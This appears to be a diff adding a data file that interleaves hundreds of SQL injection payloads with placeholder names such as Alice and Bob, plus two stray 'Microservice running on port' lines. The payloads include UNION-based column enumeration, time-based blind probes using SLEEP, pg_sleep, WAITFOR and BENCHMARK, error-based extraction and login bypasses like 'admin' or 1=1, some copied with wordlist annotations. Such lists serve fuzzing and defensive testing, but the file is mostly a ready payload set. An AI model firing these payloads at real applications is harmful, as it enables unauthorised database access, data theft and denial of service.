+'1) or sleep(5)#'
+'Bob'
+"'UNION ALL SELECT 1,2,3,4'"
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'"
+'Jill'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+"'admin"""") or """"1""""=""""1""""/*'"
+'-- -	SQL comment'
+'John'
+'David'
+'ORDER BY 3--'
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))'"
+'Alice'
+'AS INJECTX WHERE 1=1 AND 1=0'
+'admin' or 1=1'
+'Grace'
+'Bob'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Charlie'
+'ORDER BY 18--'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'"
+'-- -	SQL comment'
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'"
+'Charlie'
+'David'
+"'and (select substring(@@version,2,1))='y''"
+'Alice'
+'waitfor delay '00:00:05''
+'David'
+'David'
+'Bob'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'"
+'Eve'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--'"
+'Hank'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#'"
+'David'
+'admin') or '1'='1'#'
+"'UNION ALL SELECT 1,2,3,4'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'"
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+'ORDER BY 26--'
+'Alice'
+"'UNION ALL SELECT 1,2,3,4--'"
+'Jill'
+'Jill'
+'Fran'
+'John'
+'Fran'
+'Fran'
+'Fran'
+"'UNION ALL SELECT 1,2,3,4,5,6,7--'"
+'Bob'
+'David'
+'Jill'
+'ORDER BY 21'
+'Charlie'
+'Eve'
+'David'
+'David'
+'Bob'
+'John'
+"'"""" or pg_sleep(5)--'"
+"'"""")) or ((""""x""""))=((""""x'"
+'Charlie'
+'Bob'
+'Bob'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'"
+'Alice'
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'"
+'OR 1=1--'
+'Alice'
+'Fran'
+'Hank'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12'"
+'ORDER BY 2--'
+'David'
+Microservice running on port 3000
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+'Hank'
+'Fran'
+'1)) or pg_sleep(5)--'
+'Fran'
+"'"""")) or ((""""x""""))=((""""x'"
+'Hank'
+'Jill'
+"'1' GROUP BY 1,2,--+'"
+'Hank'
+'Hank'
+'ORDER BY 27'
+'Bob'
+'Alice'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Bob'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'"
+'Charlie'
+'Jill'
+'John'
+'OR 1=1'
+'Fran'
+'Grace'
+'David'
+'ORDER BY 27'
+'Fran'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'"
+'AS INJECTX WHERE 1=1 AND 1=0'
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'"
+'Jill'
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))'"
+'ORDER BY 26#'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'"
+'' OR '1'='1'
+'David'
+'Bob'
+'\'
+'David'
+'Eve'
+'Eve'
+'David'
+'Charlie'
+'Charlie'
+'Bob'
+'Fran'
+'Fran'
+'pg_SLEEP(5)#'
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'"
+'Charlie'
+'Eve'
+'Charlie'
+"'"""" or """"""""^""""'"
+'Alice'
+'Grace'
+'Alice'
+';%00	Nullbyte'
+'Hank'
+'David'
+'Grace'
+'Grace'
+'John'
+'Bob'
+'Hank'
+'ORDER BY 26#'
+'Hank'
+'Alice'
+'ORDER BY 14'
+'Fran'
+'``'
+'John'
+'' GROUP BY columnnames having 1=1 --'
+'' GROUP BY columnnames having 1=1 --'
+'Eve'
+'Comments:'
+'John'
+'David'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'"
+'ORDER BY 2#'
+'Charlie'
+'Hank'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'"
+"'UNION ALL SELECT 1,2,3,4,5#'"
+'Eve'
+'Alice'
+'Grace'
+'Jill'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'"
+"'-1' UNION SELECT 1,2,3--+'"
+'Eve'
+'Hank'
+'OR 1=0#'
+'John'
+'Grace'
+'Grace'
+'or pg_SLEEP(5)#'
+'Fran'
+"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'"
+'Grace'
+"'"""" or """"""""&""""'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--'"
+'Eve'
+'UNION ALL SELECT 1'
+'ORDER BY 23#'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Charlie'
+'OR 1=0--'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'"
+'John'
+'RANDOMBLOB(1000000000/2)'
+'Alice'
+'Fran'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'"
+'Grace'
+'Grace'
+'Jill'
+"'""""""""'"
+'\\'
+'Alice'
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'"
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#'"
+"'' or benchmark(10000000,MD5(1))#'"
+'Fran'
+'Jill'
+'Fran'
+'Jill'
+'Eve'
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+'David'
+'Alice'
+'John'
+'&&SLEEP(5)--'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'"
+'Eve'
+'Alice'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'"
+'1)) or pg_sleep(5)--'
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'"
+"'SLEEP(5)=""""'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'"
+'Eve'
+'AS INJECTX WHERE 1=1 AND 1=0'
+'Bob'
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'"
+'Bob'
+'Eve'
+'UNION ALL SELECT 1'
+'Bob'
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'"
+'Bob'
+'admin' or 1=1--'
+'David'
+'admin' or 1=1#'
+'David'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'"
+'Jill'
+'David'
+'David'
+'Jill'
+'Jill'
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=''
+'Fran'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'"
+"'"""" or """"x""""=""""x'"
+'Bob'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'"
+'David'
+'Eve'
+'Eve'
+"'"""";"
+'Bob'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))'"
+"'and (select substring(@@version,1,1))='M''"
+'Jill'
+'John'
+'Jill'
+'Fran'
+'Hank'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'"
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'"
+'Fran'
+'Fran'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'"
+'' or ''*''
+'John'
+'David'
+"'admin"""") or """"1""""=""""1""""--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'"
+'Grace'
+'Eve'
+'Hank'
+'John'
+"'admin"""" or """"1""""=""""1'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'"
+'Eve'
+'';WAITFOR DELAY '0:0:30'--'
+'Eve'
+'John'
+'ORDER BY 28--'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'"
+''-''
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+'David'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#'"
+'AND 7506=9091 AND ('5913=5913'
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'"
+'David'
+'Hank'
+'Fran'
+"'-1' UNION SELECT 1,2,3--+'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'"
+'Jill'
+'ORDER BY SLEEP(5)--'
+'ORDER BY 6--'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#'"
+'Fran'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'"
+'ORDER BY 5'
+'Jill'
+'Jill'
+'Eve'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+'Fran'
+'John'
+'#	    Hash comment'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'"
+'Alice'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+'ORDER BY SLEEP(5)--'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))'"
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'Grace'
+'John'
+'%		wildcard attribute indicator'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+'John'
+'Eve'
+'Grace'
+'Grace'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#'"
+'Hank'
+'Jill'
+'Fran'
+'RANDOMBLOB(500000000/2)'
+'Eve'
+'' or true--'
+'ORDER BY SLEEP(5)'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'"
+'John'
+'' AND 1=0 UNION ALL SELECT 'malicious_data'
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'"
+'ORDER BY 25--'
+"'') or benchmark(10000000,MD5(1))#'"
+'# from wapiti'
+'admin') or '1'='1'#'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'"
+'Eve'
+'Hank'
+'Bob'
+"'""""^""""'"
+'Eve'
+'Fran'
+'Bob'
+'Jill'
+'Fran'
+'pg_sleep(5)--'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'"
+'ORDER BY 25--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7'"
+'Grace'
+'Bob'
+Microservice running on port 5400
+'ORDER BY 12--'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'"
+"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'"
+'admin' --'
+'Hank'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'"
+'John'
+"'UNION ALL SELECT 1,2,3'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'"
+'Jill'
+'John'
+'admin' or '1'='1'/*'
+'Hank'
+'Alice'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'"
+"',(select * from (select(sleep(10)))a)'"
+'Charlie'
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'"
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+'David'
+'Charlie'
+'Alice'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+'David'
+'David'
+'Jill'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'"
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'"
+'Eve'
+'Jill'
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#'"
+'Grace'
+'John'
+'Jill'
+"'1' ORDER BY 1,2--+'"
+'ORDER BY 12--'
+'Bob'
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'"
+'Hank'
+'John'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'"
+"'admin"""") or (""""1""""=""""1""""/*'"
+"'AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'"
+'Eve'
+'Fran'
+'Alice'
+'Jill'
+'Alice'
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'"
+'Alice'
+'Grace'
+'WHERE 1=1 AND 1=0--'
+'HAVING 1=1--'
+'Grace'
+'Bob'
+'Grace'
+'Hank'
+'Grace'
+'Fran'
+'Alice'
+'ORDER BY 13#'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15'"
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'"
+'' or '' ''
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'"
+'Eve'
+'1 AND (SELECT * FROM Users) = 1'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9#'"
+'John'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
+'John'
+'Fran'
+'John'
+'John'
+'Fran'
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+'Fran'
+'ORDER BY 4#'
+'Jill'
+"'and (select substring(@@version,3,1))='S''"
+'Charlie'
+'Grace'
+'') or true--'
+'Grace'
+'Grace'
+'WHERE 1=1 AND 1=0'
+"'-1' UNION SELECT 1,2,3--+'"
+'John'
+'Jill'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'"
+');
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'"
+'Jill'
+'Bob'
+'Fran'
+'John'
+'Eve'
+'Eve'
+'Jill'
+"'1' GROUP BY 1,2,3--+'"
+'Hank'
+'Fran'
+'AND true'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'"
+'Alice'
+'Fran'
+'Alice'
+'Charlie'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'"
+'ORDER BY 1--'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'"
+'Jill'
+'AND 1'
+'&&SLEEP(5)'
+'Eve'
+"'"""")) or benchmark(10000000,MD5(1))#'"
+'Eve'
+'Grace'
+'OR 1=0--'
+'John'
+'ORDER BY 13#'
+'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),4#'"
+'Jill'
+'ORDER BY 24#'
+"'1) or benchmark(10000000,MD5(1))#'"
+'Bob'
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'"
+''&&SLEEP(5)&&'1'
+"'benchmark(50000000,MD5(1))'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--'"
+'Charlie'
+"'"""") or true--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3'"
+'John'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9--'"
+'Alice'
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'"
+"'"""") or benchmark(10000000,MD5(1))#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'"
+'UNION ALL SELECT SLEEP(5)--'
+'Fran'
+''LIKE''
+'Eve'
+'Charlie'
+'''
+'Charlie'
+"'""""""""'"
+'Eve'
+'Hank'
+"'ORDER BY 1,SLEEP(5),3,4--'"
+'Hank'
+'Charlie'
+'Alice'
+'Eve'
+'WHERE 1=1 AND 1=0#'
+'Bob'
+"'and (select substring(@@version,3,1))='X''"
+'Jill'
+'ORDER BY 16'
+'Jill'
+'Grace'
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'"
+''''
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#'"
+'Hank'
+'Jill'
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'"
+'David'
+'Eve'
+'Hank'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'"
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'Fran'
+"'UNION ALL SELECT 1,2,3,4,5'"
+'ORDER BY 28#'
+'John'
+'Jill'
+'Bob'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'"
+'')) or pg_sleep(5)--'
+'Jill'
+'Eve'
+"'-1 UNION SELECT 1 INTO @,@'"
+'Bob'
+'UNION ALL SELECT 1--'
+'Fran'
+'Jill'
+'John'
+'Bob'
+'Jill'
+'Charlie'
+'Fran'
+'Alice'
+'Charlie'
+'Hank'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'"
+"'""""'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'"
+'Eve'
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'"
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'"
+'Bob'
+'ORDER BY 29'
+'Eve'
+'David'
+'Hank'
+'AND 7506=9091 AND (5913=5913'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'"
+'Grace'
+'Grace'
+'Grace'
+'John'
+'John'
+'Charlie'
+'ORDER BY 14'
+'ORDER BY 8#'
+'Jill'
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'Jill'
+'Hank'
+'Alice'
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+'ORDER BY 24'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'"
+'Hank'
+'Hank'
+'UNION ALL SELECT 1--'
+'Eve'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'"
+'ORDER BY 26'
+'ORDER BY 26#'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'"
+'1*56'
+''''''''''''''UNION SELECT '2'
+'David'
+'Alice'
+'Bob'
+'Hank'
+'Jill'
+'Alice'
+'Charlie'
+'Charlie'
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--'
+"'admin"""") or (""""1""""=""""1""""/*'"
+'Jill'
